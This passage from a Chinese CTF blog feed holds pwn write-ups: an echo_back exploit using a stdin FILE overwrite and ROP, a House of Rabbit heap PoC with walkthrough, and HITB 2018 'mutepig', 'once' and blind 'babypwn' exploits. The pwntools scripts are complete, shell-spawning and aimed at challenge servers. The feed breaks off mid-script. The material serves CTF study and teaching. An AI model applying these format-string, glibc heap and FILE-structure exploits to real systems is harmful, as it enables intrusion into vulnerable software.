'/home/ctf/flag\0'p.sendline(rop)p.interactive()'''hex(-0x7fb165afd580 +0x7fb174d53000) 0xf255a80hex(-0x7f810afe4db0 + 0x7f811af62000) 0xff7d250hex(-0x7fe3844beeb0 + 0x7fe394428000) 0xff69150hex(-0x7f73844633a0 + 0x7f73940a9000) 0xfc45c600x0000000000001823 : pop rdi ; ret0x0000000000001821 : pop rsi ; pop r15 ; ret 00000000 23 28 99 7f 32 56 00 00 20 2f 20 00 00 00 00 00 │#(··│2V··│ / ·│····│ 00000010 00 0b 00 00 00 00 00 00 23 28 99 7f 32 56 00 00 │····│····│#(··│2V··│ 00000020 70 2f 20 00 00 00 00 00 00 0b 00 00 00 00 00 00 │p/ ·│····│····│····│ 00000030 23 28 99 7f 32 56 00 00 30 2f 20 00 00 00 00 00 │#(··│2V··│0/ ·│····│ 00000040 00 0b 00 00 00 00 00 00 0a [DEBUG] Sent 0x49 bytes: 00000000 23 28 99 7f 32 56 00 00 20 2f 20 00 00 00 00 00 │#(··│2V··│ / ·│····│ 00000010 00 0b 00 00 00 00 00 00 23 28 99 7f 32 56 00 00 │····│····│#(··│2V··│ 00000020 70 2f 20 00 00 00 00 00 00 0b 00 00 00 00 00 00 │p/ ·│····│····│····│ 00000030 23 28 99 7f 32 56 00 00 30 2f 20 00 00 00 00 00 │#(··│2V··│0/ ·│····│ 00000040 00 0b 00 00 00 00 00 00 0a │····│····│·│ 00000049[*] Switching to interactive mode: [DEBUG] Received 0x40 bytes: '/home/ctf/run.sh: line 2: 84 Segmentation fault ./house\n'/home/ctf/run.sh: line 2: 84 Segmentation fault ./house[*] Got EOF while reading in interactive$ ''' echo back此题当时没有做出来就和本科室友出去玩了… 后来回来复现了一下 漏洞分析总体来说题目逻辑简单，漏洞也比较明显——格式化字符串，但是格式化字符串的长度是有限制的： 首先利用格式化字符串可以泄露PIE、栈、libc地址。存在一个setname函数，可以由用户输入一个长度为7的值，由此步骤和格式化字符串漏洞，可以达到一个向任意地址写一个四字节或两字节或单字节的\x00。 向任意地址写单字节的\x00还是比较敏感的，在去年的WHCTF 2017 中出现过一道向_IO_buf_base末位写\x00的利用方法，但是给定的libc是libc-2.24.so，此题虽然给的是libc-2.23.so，同样利用这个方法。 漏洞利用该种利用方法利用的是文件IO中的几个指针在scanf中的应用。之前针对IO的利用也写过一些，比如House of Orange，那种利用方法比较复杂，是与堆结合，之前写过一篇丢到了看雪上：https://bbs.pediy.com/thread-223334.htm 这个攻击方法没有那么复杂，但是需要读scanf的源码。 首先scanf调用了 _IO_vfscanf ，并且提供增加了操作的文件指针stdin，这个指针很熟悉，是0号文件。其结构体是： 其中红圈内的指针是本次漏洞利用主角 继续追踪_IO_vfscanf 函数，其具体实现是内联函数_IO_vfscanf_internal，其内部实现了scanf对于格式化的操作，其中比较重要的是inchar()，这个函数是读入用户输入数据的函数。此函数最终调用了_IO_new_file_underflow进行输入，这个最底层的操作。 查看函数逻辑 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970int_IO_new_file_underflow (_IO_FILE *fp)&#123; _IO_ssize_t count;#if 0 /* SysV does not make this test; take it out for compatibility */ if (fp-&gt;_flags &amp; _IO_EOF_SEEN) return (EOF);#endif if (fp-&gt;_flags &amp; _IO_NO_READS) &#123; fp-&gt;_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return EOF; &#125; if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end) return *(unsigned char *) fp-&gt;_IO_read_ptr; if (fp-&gt;_IO_buf_base == NULL) &#123; /* Maybe we already have a push back pointer. */ if (fp-&gt;_IO_save_base != NULL) &#123; free (fp-&gt;_IO_save_base); fp-&gt;_flags &amp;= ~_IO_IN_BACKUP; &#125; _IO_doallocbuf (fp); &#125; if (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED)) &#123;#if 0 _IO_flush_all_linebuffered ();#else _IO_acquire_lock (_IO_stdout); if ((_IO_stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF)) == (_IO_LINKED | _IO_LINE_BUF)) _IO_OVERFLOW (_IO_stdout, EOF); _IO_release_lock (_IO_stdout);#endif &#125; _IO_switch_to_get_mode (fp); fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base; fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base; fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = fp-&gt;_IO_buf_base; count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base); if (count &lt;= 0) &#123; if (count == 0) fp-&gt;_flags |= _IO_EOF_SEEN; else fp-&gt;_flags |= _IO_ERR_SEEN, count = 0; &#125; fp-&gt;_IO_read_end += count; if (count == 0) &#123; fp-&gt;_offset = _IO_pos_BAD; return EOF; &#125; if (fp-&gt;_offset != _IO_pos_BAD) _IO_pos_adjust (fp-&gt;_offset, count); return *(unsigned char *) fp-&gt;_IO_read_ptr;&#125;libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow) 当_IO_read_ptr &lt; _IO_read_end时，函数直接返回_IO_read_ptr。反之，则会进行一系列赋值操作，最终调用read的系统调用向_IO_buf_base中读入数据。可以想到，当可以控制_IO_buf_base的值就可以达到任意地址写的目的了。 题目中可以利用是因为当覆盖为00时，指针恰好指向了stdin内部地址，并且可以再次覆写_IO_buf_base进一步造成内存任意写，而在scanf后面跟了一个getchar()函数，每次调用这个函数是会导致_IO_read_ptr++。 由于在覆写_IO_base_buf时，会造成_IO_read_end+=输入的size，不断利用getchar可以使得_IO_read_ptr逐渐增大到_IO_read_end，最终再次调用read系统调用，达到内存任意写的目的。第二次覆写_IO_buf_base的内容为函数返回地址，写入ROP即可拿到shell EXP1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#coding:utf-8from pwn import *from ctypes import *debug = 1elf = ELF('./echo_back')if debug: p = process('./echo_back') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' #gdb.attach(p)else: p = remote('117.78.43.123', 32619) libc = ELF('./libc.so.6') #off = 0x001b0000 context.log_level = 'debug'def set_name(name): p.recvuntil('choice&gt;&gt;') p.sendline('1') p.recvuntil('name') p.send(name)def echo(content): p.recvuntil('choice&gt;&gt;') p.sendline('2') p.recvuntil('length:') p.sendline('-1') p.send(content)echo('%12$p\n')p.recvuntil('anonymous say:')stack_addr = int(p.recvline()[:-1],16)print '[+] stack :',hex(stack_addr)echo('%13$p\n')p.recvuntil('anonymous say:')pie = int(p.recvline()[:-1],16)-0xd08print '[+] pie :',hex(pie)echo('%19$p\n')p.recvuntil('anonymous say:')libc.address = int(p.recvline()[:-1],16)-240-libc.symbols['__libc_start_main']print '[+] system :',hex(libc.symbols['system'])set_name(p64(libc.address + 0x3c4918)[:-1])echo('%16$hhn')p.recvuntil('choice&gt;&gt;')p.sendline('2') p.recvuntil('length:')padding = p64(libc.address+0x3c4963)*3 + p64(stack_addr-0x28)+p64(stack_addr+0x10)p.send(padding)p.sendline('')for i in range(len(padding)-1): p.recvuntil('choice&gt;&gt;') p.sendline('2') p.recvuntil('length:') p.sendline('')p.recvuntil('choice&gt;&gt;')p.sendline('2') p.recvuntil('length:')rop = p64(pie+0x0000000000000d93)+p64(next(libc.search('/bin/sh')))+p64(libc.symbols['system'])p.sendline(rop)p.sendline('')p.interactive()'''Gadgets information============================================================0x0000000000000d8c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000000d8e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000000d90 : pop r14 ; pop r15 ; ret0x0000000000000d92 : pop r15 ; ret0x0000000000000d8b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000000d8f : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000000940 : pop rbp ; ret0x0000000000000d93 : pop rdi ; ret0x0000000000000d91 : pop rsi ; pop r15 ; ret0x0000000000000d8d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000000861 : ret''']]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[House Of Rabbit 原理]]></title>
    <url>%2F2018%2F04%2F18%2Fhouse-of-rabbit%2F</url>
    <content type="text"><![CDATA[House Of Rabbit是一个比较新的堆利用姿势，在满足条件的情况下，可以绕过堆块的地址随机化保护（ASLR）达到任意地址分配的目的。 所需条件 可以分配任意大小的堆块并且释放，主要包括三类fastbin大小的堆块、smallbin大小的堆块、较大的堆块（用于分配到任意地址处） 存在一块已知地址的内存空间，并可以任意写至少0x20长度的字节 存在fastbin dup、UAF等漏洞，用于劫持fastbin的fd指针。 当存在上述三个条件时，即可使用House Of Rabbit攻击方法，Rabbit的含义大概是可以JUMP到任意地址（日本人的冷幽默？？） 利用方法使用样例在此处有可以使用的样例文件，来自 shift-crops ，如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798/* PoC of House of Rabbit Tested in Ubuntu 14.04, 16.04 (64bit). Yutaro Shimizu @shift_crops 2017/09/14*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char target[0x10] = "Hello, World!";unsigned long gbuf[6] = &#123;0&#125;;int main(void)&#123; void *p, *fast, *small, *fake; char *victim; printf( "This is PoC of House of Rabbit\n" "This technique bypassing Heap ASLR without leaking address, " "and make it possible to overwrite a variable located at an arbitary address.\n" "Jump like a rabbit and get an accurate address by malloc! :)\n\n"); // 1. Make 'av-&gt;system_mem &gt; 0xa00000' printf("1. Make 'av-&gt;system_mem &gt; 0xa00000'\n"); p = malloc(0xa00000); printf(" Allocate 0xa00000 byte by mmap at %p, and free.\n", p); free(p); p = malloc(0xa00000); printf(" Allocate 0xa00000 byte in heap at %p, and free.\n", p); free(p); printf(" Then, the value of 'av-&gt;system_mem' became larger than 0xa00000.\n\n"); // 2. Free fast chunk and link to fastbins printf("2. Free fast chunk and link to fastbins\n"); fast = malloc(0x10); // any size in fastbins is ok small = malloc(0x80); printf( " Allocate fast chunk and small chunk.\n" " fast = %p\n" " small = %p\n", fast, small); free(fast); printf(" Free fast chunk.\n\n"); // 3. Make fake_chunk on .bss printf("3. Make fake_chunk on .bss\n"); gbuf[1] = 0x11; gbuf[3] = 0xfffffffffffffff1; printf( " fake_chunk1 (size : 0x%lx) is at %p\n" " fake_chunk2 (size : 0x%lx) is at %p\n\n" , gbuf[3], &amp;gbuf[2], gbuf[1], &amp;gbuf[0]); // VULNERABILITY // use after free or fastbins dup etc... fake = &amp;gbuf[2]; printf( "VULNERABILITY (e.g. UAF)\n" " *fast = %p\n" , fake); *(unsigned long**)fast = fake; printf(" fastbins list : [%p, %p, %p]\n\n", fast-0x10, fake, *(void **)(fake+0x10)); // 4. call malloc_consolidate printf( "4. call malloc_consolidate\n" " Free the small chunk (%p) next to top, and link fake_chunk1(%p) to unsorted bins.\n\n" , small, fake); free(small); // 5. Link unsorted bins to appropriate list printf( "5. Link unsorted bins to appropriate list\n" " Rewrite fake_chunk1's size to 0xa0001 to bypass 'size &lt; av-&gt;system_mem' check.\n"); gbuf[3] = 0xa00001; malloc(0xa00000); printf( " Allocate huge chunk.\n" " Now, fake_chunk1 link to largebin[126](max).\n" " Then, write fake_chunk1's size back to 0xfffffffffffffff1.\n\n"); gbuf[3] = 0xfffffffffffffff1; // 6. Overwrite targer variable printf( "6. Overwrite targer variable on .data\n" " target is at %p\n" " Before : %s\n" , &amp;target, target); malloc((void*)&amp;target-(void*)(gbuf+2)-0x20); victim = malloc(0x10); printf(" Allocate 0x10 byte at %p, and overwrite.\n", victim); strcpy(victim, "Hacked!!"); printf(" After : %s\n", target);&#125; 下面对这个利用方法进行分步解析 步骤1 增大malloc函数中 mmap分配阈值当通过malloc函数分配内存时，当超过某特定阈值时，堆块会由mmap来分配，但同时会改变该阈值。具体改变和分配代码如下： 分配代码： 12345if ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) &amp;&amp;(mp_.n_mmaps &lt; mp_.n_mmaps_max)) &#123; …… &#125; 阈值改变： 123unsigned long sum;sum = atomic_exchange_and_add (&amp;mp_.mmapped_mem, size) + size;atomic_max (&amp;mp_.max_mmapped_mem, sum); 因此在第一阶段 12345678910// 1. Make 'av-&gt;system_mem &gt; 0xa00000'printf("1. Make 'av-&gt;system_mem &gt; 0xa00000'\n");p = malloc(0xa00000);printf(" Allocate 0xa00000 byte by mmap at %p, and free.\n", p);free(p);p = malloc(0xa00000);printf(" Allocate 0xa00000 byte in heap at %p, and free.\n", p);free(p);printf(" Then, the value of 'av-&gt;system_mem' became larger than 0xa00000.\n\n"); 第一次程序malloc(0xa00000)时，堆块由mmap分配，并且mp_.max_mmaped_mem变成0xa10000，当free以后再次malloc(0xa00000)时，系统会首先通过sbrk扩大top块进行分配，当最后一次free后，top大小变成0xa20c31 &gt; 0xa00000 步骤2 申请小堆块并放入fastbin首先malloc(0x20) ，再次malloc(0x80)，这两块都是由top直接切割得到，保证small bin大小的块挨着top。 123456789// 2. Free fast chunk and link to fastbinsprintf("2. Free fast chunk and link to fastbins\n");fast = malloc(0x20); // any size in fastbins is ok small = malloc(0x80);printf( " Allocate fast chunk and small chunk.\n" " fast = %p\n" " small = %p\n", fast, small);free(fast);printf(" Free fast chunk.\n\n"); 此时，对应的堆结构是： 步骤3 伪造堆块并劫持至fastbin在一个已知地址的内存处（如未开启PIE的程序BSS段）伪造两个连续的堆块，一个堆块大小是0x11，紧挨着是0xfffffffffffffff1，这样可以保证后续操作可以覆盖到任意地址。更重要的是这个0x11的小块即是大块的前块，也是大块的后块，可以保证在malloc中通过检查。 利用漏洞劫持fastbin，将大小为0xfffffffffffffff1的堆块，挂到fastbin上去。 1234567891011121314151617// 3. Make fake_chunk on .bssprintf("3. Make fake_chunk on .bss\n");gbuf[1] = 0x11; gbuf[3] = 0xfffffffffffffff1; printf( " fake_chunk1 (size : 0x%lx) is at %p\n" " fake_chunk2 (size : 0x%lx) is at %p\n\n" , gbuf[3], &amp;gbuf[2], gbuf[1], &amp;gbuf[0]);// VULNERABILITY// use after free or fastbins dup etc...fake = &amp;gbuf[2];printf( "VULNERABILITY (e.g. UAF)\n" " *fast = %p\n" , fake);*(unsigned long**)fast = fake;printf(" fastbins list : [%p, %p, %p]\n\n", fast-0x10, fake, *(void **)(fake+0x10)); 此时，堆块状态如下： 步骤4 利用malloc_consolidate使伪造堆块进入unsorted bin在free函数中，当释放的块大于 65536时，会触发malloc_consolidate，这个函数用于对fastbin合并，并放到unsorted bin中。 触发代码如下：(malloc.c 4071) 12345678#define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL)... if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123; if (have_fastchunks(av)) malloc_consolidate(av);... 而在malloc_consolidate()中，会循环处理各fastbin堆块，当堆块与top相邻时，与top合并。否则，将堆块放入unsorted bin中，并设置pre_size和pre_inuse位，此时较小的堆块变成 0xffffffffffffffff0 0x10 1234567891011121314151617181920212223242526272829if (nextchunk != av-&gt;top) &#123; nextinuse = inuse_bit_at_offset(nextchunk, nextsize); if (!nextinuse) &#123; size += nextsize; unlink(av, nextchunk, bck, fwd); &#125; else clear_inuse_bit_at_offset(nextchunk, 0); first_unsorted = unsorted_bin-&gt;fd; unsorted_bin-&gt;fd = p; first_unsorted-&gt;bk = p; if (!in_smallbin_range (size)) &#123; p-&gt;fd_nextsize = NULL; p-&gt;bk_nextsize = NULL; &#125; set_head(p, size | PREV_INUSE); p-&gt;bk = unsorted_bin; p-&gt;fd = first_unsorted; set_foot(p, size);&#125;else &#123; size += nextsize; set_head(p, size | PREV_INUSE); av-&gt;top = p;&#125; 对应步骤代码如下： 12345// 4. call malloc_consolidateprintf( "4. call malloc_consolidate\n" " Free the small chunk (%p) next to top, and link fake_chunk1(%p) to unsorted bins.\n\n" , small, fake);free(small); 步骤结束后，内存分布如下： 步骤5 分配内存 使伪造堆块进入large bin当伪造的堆块进入unsorted bin时，并不能达到目的，需要进一步使堆块进入large bin，此时需要将伪造的堆块大小改为0xa00001，其目的有两个，1是绕过程序对unsorted bin中内存块大小小于av-&gt;system_mem的检测；2是使程序放入large bin的最后一块（&gt;0x800000) malloc检测如下（malloc.c 3473） 1234567891011for (;; ) &#123; int iters = 0; while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) &#123; bck = victim-&gt;bk; if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0)) malloc_printerr (check_action, "malloc(): memory corruption", chunk2mem (victim), av); size = chunksize (victim); 步骤代码如下： 123456789// 5. Link unsorted bins to appropriate list printf( &quot;5. Link unsorted bins to appropriate list\n&quot; &quot; Rewrite fake_chunk1&apos;s size to 0xa00001 to bypass &apos;size &lt; av-&gt;system_mem&apos; check.\n&quot;); gbuf[3] = 0xa00001; malloc(0xa00000); printf( &quot; Allocate huge chunk.\n&quot; &quot; Now, fake_chunk1 link to largebin[126](max).\n&quot; &quot; Then, write fake_chunk1&apos;s size back to 0xfffffffffffffff1.\n\n&quot;); gbuf[3] = 0xfffffffffffffff1; 最终，程序的堆块布局如下： 步骤6 任意内存分配当伪造堆块进入large bin最后一个队列时，将伪造堆块的大小改回0xfffffffffffffff1，此时在申请任意长度的地址，使堆块地址上溢到当前堆地址的低地址位置，从而可以分配到任意地址，达到内存任意写的目的。 12345678910111213// 6. Overwrite targer variableprintf( &quot;6. Overwrite targer variable on .data\n&quot; &quot; target is at %p\n&quot; &quot; Before : %s\n&quot; , &amp;target, target);malloc((void*)&amp;target-(void*)(gbuf+2)-0x20);victim = malloc(0x10);printf(&quot; Allocate 0x10 byte at %p, and overwrite.\n&quot;, victim);strcpy(victim, &quot;Hacked!!&quot;);printf(&quot; After : %s\n&quot;, target); 相关题目HITB CTF 2018 mutepig题目提供分配大小为0x10、0x80、0xa00000、0xffffffffffffff70大小的堆块，并且没有开启PIE保护，还存在UAF漏洞，完全满足该利用方法需求，通过将内存地址分配回bss段低地址部分的堆地址指针数组，覆写数组内容为free@got，利用编辑功能，将其内容改为system@plt，在free时可以拿到shell。 坑点在于此题没有输出，调试比较坑。另外需要注意利用方法中提到的当大堆块释放到unsorted bin时，小堆块的值会有改动。 EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#coding:utf-8from pwn import *import timedebug = 0elf=ELF('mutepig')if debug: p = process('./mutepig') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug'else: p = remote('47.75.128.158', 9999) #libc = ELF('./libc.so.6') context.log_level = 'debug' #libc = ELF('./libc-2.23.so') #off = 0x001b0000def add(type,content): p.sendline('1') p.sendline(str(type)) p.send(content) time.sleep(1)def free(index): p.sendline('2') p.sendline(str(index))def edit(index,content1,content2): p.sendline('3') p.sendline(str(index)) p.send(content1) p.send(content2) time.sleep(1)bss_list = 0x06020C0bss_can_be_edit = 0x602120add(3,'p4nda_0') #0free(0)add(3,'p4nda_1') #1free(1)add(1,'p4nda_2') #2add(2,'p4nda_3') #3free(2)edit(2,p64(bss_can_be_edit+0x10)[:-1],p64(0)+p64(0x11)+p64(0)+p64(0xfffffffffffffff1)+'\0'*15)free(3)edit(2,p64(0)[:-1],p64(0)+p64(0x11)+p64(0)+p64(0xA00001))add(3,'p4nda_4') #4edit(2,p64(bss_can_be_edit+0x10)[:-1],p64(0xfffffffffffffff0)+p64(0x10)+p64(0)+p64(0xfffffffffffffff1))#add(0x3419,'p4nda_5') #5add(1,p64(elf.got['free'])[:-1])edit(0,p64(elf.symbols['system'])[:-1],'/bin/sh\0')edit(6,'/bin/sh','/bin/sh\0')free(6)p.interactive() 题目]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HITB CTF 2018 部分PWN题解]]></title>
    <url>%2F2018%2F04%2F17%2Fhitb2018%2F</url>
    <content type="text"><![CDATA[once此题共有四个函数，自行实现了一个类似于unsorted bin的数据结构，其结构体如下： 123456700000000 bin struc ; (sizeof=0x20, mappedto_1)00000000 field_0 dq ?00000008 field_8 dd ?0000000C field_C dd ?00000010 fd dq ?00000018 bk dq ?00000020 bin ends 其中第一个函数，是初始化函数，首先申请了一个0x20的数据块作为第一个堆块。 12345678910111213141516171819202122__int64 funtion1()&#123; __int64 v0; // ST18_8@1 bin *ptr; // rax@1 bin *mem; // ST10_8@1 __int64 result; // rax@1 __int64 v4; // rcx@1 v0 = *MK_FP(__FS__, 40LL); ptr = (bin *)malloc(0x20uLL); ptr-&gt;fd = 0LL; ptr-&gt;bk = 0LL; mem = (bin *)bss_once_mem; bss_once_mem = ptr; ptr-&gt;fd = (__int64)&amp;unk_202020; ptr-&gt;bk = (__int64)mem; mem-&gt;fd = (__int64)ptr; puts("suceess."); result = 0LL; v4 = *MK_FP(__FS__, 40LL) ^ v0; return result;&#125; 第二个函数，可以编辑上述堆块，造成可以覆写fd、bk指针， 1234567891011121314151617181920int funtion2()&#123; int result; // eax@2 __int64 v1; // rdx@4 __int64 v2; // [sp+8h] [bp-8h]@1 v2 = *MK_FP(__FS__, 40LL); if ( bss_once_flag == 1 ) &#123; result = -1; &#125; else &#123; write_(bss_once_mem, 0x20u); bss_once_flag = 1; result = puts("success."); &#125; v1 = *MK_FP(__FS__, 40LL) ^ v2; return result;&#125; 第三个函数，实现了一个unlink操作，由于第二个函数导致内存任意写 123456789101112131415161718192021int funtion3()&#123; int result; // eax@2 __int64 v1; // rcx@4 __int64 v2; // [sp+8h] [bp-8h]@1 v2 = *MK_FP(__FS__, 40LL); if ( bss_once_flag_2 == 1 ) &#123; result = -1; &#125; else &#123; bss_once_mem = (bin *)bss_once_mem-&gt;bk; bss_once_mem-&gt;fd = (__int64)&amp;unk_202020; bss_once_flag_2 = 1; result = puts("success."); &#125; v1 = *MK_FP(__FS__, 40LL) ^ v2; return result;&#125; 第四个函数中可以申请任意大的堆块，并对这个堆块申请、释放。 此题中开启了全部保护，因此无法获悉其内部任何地址。 本题解题思路是： 1 根据给定的功能泄露libc地址 2 使用1功能初始链 3 利用4功能申请一个大堆块备用 4 利用2功能，修改小堆块中的fd指针的末位字节（由于bss地址未知），使其地址指向bss段上ptr指针-0x10 5 利用3功能unlink，使bss段上ptr指针写入 PIE + 0x202020的地址 6 利用4功能中的编辑函数，由于ptr指针已被我们覆盖，因此可以对bss段上内容任意写，目的是覆盖功能2的指针及功能使用限制的标志位 7 将__free_hook覆写为system，释放堆块，得到shell EXP： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *from ctypes import *debug = 1elf = ELF('./once')#flag&#123;t1-1_1S_0_sImPl3_n0T3&#125;if debug: p = process('./once') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' gdb.attach(p)else: p = remote('47.75.189.102', 9999) libc = ELF('./libc-2.23.so') #off = 0x001b0000 context.log_level = 'debug'p.recvuntil('&gt;')p.sendline('0')p.recvuntil('Invalid choice\n')libc.address = int(p.recvuntil('&gt;')[:-1],16)-libc.symbols['puts']p.sendline('1')p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('1')p.recvuntil('size:')p.sendline(str(0xe0))p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('2')p.send('a'*16+'b'*8 + chr(0x58))p.recvuntil('&gt;')p.sendline('3')p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('2')p.send('/bin/sh\0'+ '\0'*0x10 + p64(libc.symbols['__free_hook']) + p64(libc.symbols['_IO_2_1_stdout_'] )+ p64(0) + p64(libc.symbols['_IO_2_1_stdin_']) + p64(0)*2 + p64(next(libc.search('/bin/sh'))) +p64(0)*4 )p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('2')p.send(p64(libc.symbols['system']))p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('3')print '[*] system ',hex(libc.symbols['system'])p.interactive()#0x08048e48 : add esp, 0x1c ; ret babypwn此题题目给出的提示就是盲pwn ，通过测试可以明显分析出漏洞是格式化字符串，并且偏移是6。并且程序是64位程序，所以编写泄露脚本来dump脚本就可以了。 此题的坑点在于使用gets函数来接收用户输入，因此输入\x0a及\x20会被截断 此题的坑点在于使用gets函数来接收用户输入，因此输入\x0a及\x20会被截断 此题的坑点在于使用gets函数来接收用户输入，因此输入\x0a及\x20会被截断 这一点坑了好久一直不懂为啥每次dump输出出来的内容都不对，最后dump出来后修改了几个字节读出了程序的正常逻辑： 12345678910111213141516void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; char format; // [sp+0h] [bp-110h]@2 __int64 v4; // [sp+108h] [bp-8h]@1 v4 = v28; setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); while ( 1 ) &#123; gets((__int64)&amp;format, 0LL); usleep(0); printf(&amp;format); &#125;&#125; 有了binary文件就比较简单了，通过got表可以泄露出题中给出的setbuf、gets、usleep函数地址，其中printf@got不可用，因为地址是0x601020 ，利用libc-database得到程序的libc。 最终通过修改gets@got为system及linux的并行命令拿到shell，64位的程序格式化字符串需要注意的坑点是哟啊先写字符串再加地址，否则是有截断的。 EXP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180#coding:utf-8from pwn import *debug = 0count = 0#HITB&#123;Baby_Pwn_BabY_bl1nd&#125;#context(arch='i386',os='linux',endian='little')now = 0if debug: p = process('./easy_pwn') libc = ELF('libc6_2.23-0ubuntu10_amd64.so') #context.kernel = 'amd64' #off = 0x001b2000 context.log_level = 'debug' #gdb.attach(p) #gdb.attach(p,'vmmap') gdb.attach(p,'b *0x804882b')else: p = remote('47.75.182.113', 9999) libc = ELF('libc6_2.23-0ubuntu10_amd64.so') context.log_level = 'debug' #libc = ELF('./libc-2.23.so') #off = 0x001b0000offset = 11def leak(str,output,addr): global now,count #p.recvuntil('Username:') #p.sendline(str) #p.recvuntil('Hello ') #if('Password') #tmp = p.recvuntil('p4nda')#recvuntil('p1e') #a = tmp[0] #if (tmp[0] == 'p') &amp; (tmp[1] == '1')&amp; (tmp[2] == 'e'): # a = '\0' #print (a) #p = remote('47.75.182.113', 9999) p.sendline(str) p.recvuntil('&lt;&lt;&lt;&lt;') tmp = p.recvuntil('&gt;&gt;&gt;&gt;') #print tmp if tmp.startswith('&gt;&gt;&gt;&gt;'): a = '\0' now += 1 else: if addr&amp;0xff == 0x0a: #print '[-] error' #exit(0) count +=1 now += 1 a = '\xf0' else: a = tmp.split('&gt;&gt;&gt;&gt;')[0] now += len(a) print a output.write(a) #p.close() #p.sendline('')def find_offset(): for i in range(1,20): str = '%%%d$x'%(i) print '[%d]'%i leak(str)def ori_file(str,output): p.recvuntil('Username:') p.sendline(str) #p.recvuntil('p4nda') p.recvuntil('Hello ') a = p.recv(1) print hex(int(a)), output.write(a) p.recvuntil('Password') p.sendline('')def find_ori(): i = 0 output = open('bin', 'wb') pro = log.progress('ori_geting') end = 0x1000 while now &lt; end: pro.status('recover:'+hex(0x400000+now)) str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0' +p64(0x400000+now) leak(str,output,0x400000+now) ''' for i in range(0,0x1000): #find_offset() pro.status('recover:'+hex(0x400000+i)) str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0' +p64(0x400000+i) #'%7$s'+'p1e'+'\0'+p64(0x400000+i)+'\np4nda\0\0\0'# + p32(0x8048970) leak(str,output,0x400000+i) ''' ''' for i in range(0,0x2000): #find_offset() pro.status('recover:'+hex(0x600000+i)) str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0' +p64(0x600000+i)# + p32(0x8048970) #str = '%7$s'+'p1e'+'\0'+p64(0x600000+i)+'\np4nda\0\0\0'# + p32(0x8048970) leak(str,output,0x600000+i) ''' pro.success('get ori_file') output.close()#find_ori()def test(): while 1: a = raw_input() str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0'+p64(int(a,16)) + '\n'# + p32(0x8048970) + p.sendline(str) p.recvuntil('&lt;&lt;&lt;&lt;') tmp = p.recvuntil('&gt;&gt;&gt;&gt;') print tmp if tmp.startswith('&gt;&gt;&gt;&gt;'): a = '\0' else: a = tmp[0] print a#test()#str = '%7$s'+'p1e'+'\0'+p64(0x40070b)#p.sendline(str)#def find_password():#str = '%14$s'+'\0'*2+'p4nda'+p32(0x804A08C)#find_password(str) #i+=1'''for i in range(0,100): str = '%13$caaa' + p32(0x8040000+i*4) leak(str)'''#print '[-] count ',countstr = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0'+p64(0x601018) + '\n'p.sendline(str)p.recvuntil("&lt;&lt;&lt;&lt;")leak1 = u64(p.recv(6).ljust(8,'\0'))str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0'+p64(0x601030) + '\n'p.sendline(str)p.recvuntil("&lt;&lt;&lt;&lt;")leak2 = 